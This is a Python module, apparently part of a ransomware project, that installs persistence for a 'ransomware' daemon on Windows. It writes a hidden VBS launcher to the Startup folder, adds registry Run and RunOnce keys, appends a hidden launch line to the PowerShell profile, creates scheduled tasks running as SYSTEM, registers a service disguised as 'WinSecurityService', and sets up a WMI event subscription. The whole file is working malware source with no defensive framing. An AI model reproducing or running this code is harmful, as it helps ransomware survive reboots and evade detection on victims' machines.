import os
import subprocess
import shutil
import winreg
import ctypes
import sys
from pathlib import Path
import variables

def is_admin():
    """Check if running with administrative privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def startup():
    """Create entries in the user's startup folder"""
    try:
        # Windows startup folder
        startup_path = os.path.join(os.environ['APPDATA'], 
                                    r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Create VBS script to launch daemon invisibly
        vbs_path = os.path.join(startup_path, f"{variables.ransomware_name}_daemon.vbs")
        with open(vbs_path, 'w') as f:
            f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
            f.write(f'WshShell.Run """{variables.daemon_path}""", 0, False')
        
        print(f"[+] Added {variables.ransomware_name} to startup folder")
        return True
    except Exception as e:
        print(f"[-] Failed to create startup entry: {e}")
        return False

def systemctl():
    """Windows equivalent of systemd service - creates a Windows service"""
    if not is_admin():
        print("[-] Admin rights required to create Windows service")
        return False
        
    try:
        # Create a service using sc.exe
        service_name = "WinSecurityService"  # Windows-friendly name
        
        # Create service
        cmd = f'sc create {service_name} binPath= "{variables.daemon_path}" start= auto'
        subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Start service
        subprocess.run(f'sc start {service_name}', shell=True, 
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        print(f"[+] Created and started {service_name} service")
        return True
    except Exception as e:
        print(f"[-] Failed to create Windows service: {e}")
        return False

def bashrcs():
    """Windows equivalent - modify registry run keys"""
    run_keys = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    ]
    
    success = False
    for key_path in run_keys:
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, variables.ransomware_name, 0, 
                             winreg.REG_SZ, variables.daemon_path)
            winreg.CloseKey(key)
            success = True
            print(f"[+] Added {variables.ransomware_name} to registry key {key_path}")
        except Exception as e:
            print(f"[-] Failed to add to registry key {key_path}: {e}")
    
    # Also try to add to PowerShell profile
    try:
        ps_profile_path = os.path.expandvars(r'%USERPROFILE%\Documents\WindowsPowerShell\profile.ps1')
        os.makedirs(os.path.dirname(ps_profile_path), exist_ok=True)
        
        with open(ps_profile_path, 'a+') as f:
            f.write(f'\nStart-Process -WindowStyle Hidden "{variables.daemon_path}"\n')
        
        print("[+] Added to PowerShell profile")
        success = True
    except Exception as e:
        print(f"[-] Failed to modify PowerShell profile: {e}")
        
    return success

def crontab():
    """Windows equivalent - create scheduled task"""
    try:
        # Create scheduled task that runs at system startup
        task_name = f"{variables.ransomware_name}_updater"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{variables.daemon_path}" /sc onstart /ru SYSTEM /f'
        
        # Run the command
        subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Also create a task that runs at login
        task_name2 = f"{variables.ransomware_name}_service"
        cmd2 = f'schtasks /create /tn "{task_name2}" /tr "{variables.daemon_path}" /sc onlogon /f'
        subprocess.run(cmd2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        print("[+] Created scheduled tasks for persistence")
        return True
    except Exception as e:
        print(f"[-] Failed to create scheduled task: {e}")
        return False

# Additional Windows-specific persistence method
def wmi_persistence():
    """Create WMI event subscription for advanced persistence"""
    if not is_admin():
        return False
        
    try:
        # PowerShell command to create WMI subscription
        ps_command = f'''
        $filterName = "WinSecurityFilter"
        $consumerName = "WinSecurityConsumer"
        $Command = '{variables.daemon_path}'
        
        $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{
            Name = $filterName;
            EventNameSpace = 'root\\cimv2';
            QueryLanguage = 'WQL';
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
        }}
        
        $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
            Name = $consumerName;
            CommandLineTemplate = $Command;
        }}
        
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
            Filter = $WMIEventFilter;
            Consumer = $WMIEventConsumer;
        }}
        '''
        
        subprocess.run(['powershell', '-Command', ps_command], 
                      shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        print("[+] Established WMI persistence")
        return True
    except Exception as e:
        print(f"[-] Failed to create WMI persistence: {e}")
        return False

if __name__ == "__main__":
    # Try all persistence methods
    print("Establishing persistence...")
    startup()
    bashrcs()
    crontab()
    
    # Admin-only methods
    if is_admin():
        systemctl()
        wmi_persistence()
    else:
        print("[-] Not running as admin. Some persistence methods unavailable.")
    
    print("Persistence setup complete")